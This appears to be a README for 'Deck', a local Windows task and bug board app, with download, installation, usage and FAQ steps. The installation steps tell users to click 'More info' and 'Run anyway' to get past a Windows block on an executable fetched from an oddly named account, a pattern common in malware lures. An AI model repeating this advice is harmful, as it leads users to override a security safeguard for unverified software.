# 📋 Deck - Manage your projects with ease

[![](https://img.shields.io/badge/Download-Deck-blue.svg)](https://github.com/atheist-grammaticalgender460/Deck)

## 📌 Overview

Deck helps you track bugs and features for your projects. It runs on your computer. Your data stays on your machine. You do not need an account to use this app. The interface uses a clean design inspired by Liquid Glass to help you focus on your work.

## ✨ Key Features

*   **Project Boards:** Organize your tasks into categories. Drag and drop cards to update their status.
*   **Three-Pane Editor:** View your card list, task details, and project stats on one screen.
*   **Built-in Stats:** Track your progress over time with simple charts.
*   **Local Storage:** Your files remain private. The app stores everything on your hard drive.
*   **Drag-and-Drop:** Move items between categories with your mouse. Completing a task feels intuitive.
*   **No Accounts:** You do not need to sign up or log in. Launch the app and start working.

## 🛠️ System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 200 megabytes of free space.
*   **Display:** A resolution of 1280x720 or higher.
*   **Permissions:** You need permission to install new software on your machine.

## 📥 Getting Started

Follow these steps to set up Deck on your computer.

1. Visit the [official repository page](https://github.com/atheist-grammaticalgender460/Deck) to find the latest version of the app.
2. Look for the "Releases" section on the right side of the page.
3. Click the latest version link.
4. Find the file ending in `.exe` under the Assets heading.
5. Click the file to download it to your Downloads folder.

## ⚙️ Installation

Once the file finishes downloading, complete the installation process:

1. Open your Downloads folder.
2. Double-click the `Deck-Installer.exe` file.
3. A security window might appear. Click "More info" and then "Run anyway" if Windows blocks the file.
4. Follow the prompts in the installation window.
5. Choose a destination folder or keep the default one.
6. Check the box to create a shortcut icon on your desktop.
7. Click "Finish" to complete the setup.

## 🚀 Running the App

After installation, look for the Deck icon on your desktop or in your Start menu.

1. Double-click the Deck icon.
2. The main board appears.
3. Click "New Project" to create your first space.
4. Add categories such as "To Do," "In Progress," and "Done."
5. Click the "+" button inside a category to add cards.

## 📝 Managing Your Cards

You manage your workflow through the board view. Select a card to open the three-pane editor. The left pane shows your category list. The center pane shows the card content, such as titles and descriptions. The right pane shows your activity stats for the current project.

To move a card, click and hold it. Drag the card to the target category and release the mouse button. Your changes save automatically.

## 📉 Viewing Project Stats

Your stats update in real-time as you move cards. The dashboard displays the number of active tasks and finished items. You can filter these stats by category or date. This information helps you see which parts of your project require more attention.

## 🔐 Data Privacy

Deck does not connect to the internet to send your data. Every piece of information—your tasks, your notes, and your project categories—lives inside a local database on your computer. You keep full control over these files. If you want to back up your data, you can copy the project folder from your documents directory to an external drive.

## 🛠️ Troubleshooting

If you encounter issues, try these steps:

*   **App fails to open:** Restart your computer and try to launch the app again.
*   **Installer blocked:** Ensure you have administrator rights on your PC.
*   **Missing text:** Update your display drivers if the text appears blurry or missing.
*   **Data not saving:** Check if you have enough disk space on your primary drive.
*   **Performance issues:** Close other memory-intensive applications when running the program.

## 💡 Frequent Questions

Do I need an internet connection to use Deck?
No. The app functions entirely offline.

Can I move my boards to another computer? 
Yes. You can copy the local project files to another machine and open them using the "Import" option in the File menu.

How do I remove the app?
Open Settings, navigate to Apps, find Deck, and select Uninstall. This removes the program from your system. Note that you may need to manually remove your project data files if you want a clean slate after uninstallation.

Does the app update itself?
The app runs locally and does not check for updates automatically. Visit the download link periodically to check if a newer version is available. You can install a newer version directly over the old one to keep your files intact. 

Can I change the appearance of the board?
The app uses a fixed design style to ensure the interface remains consistent. You can rename categories and change card colors, but the layout follows the three-pane structure.
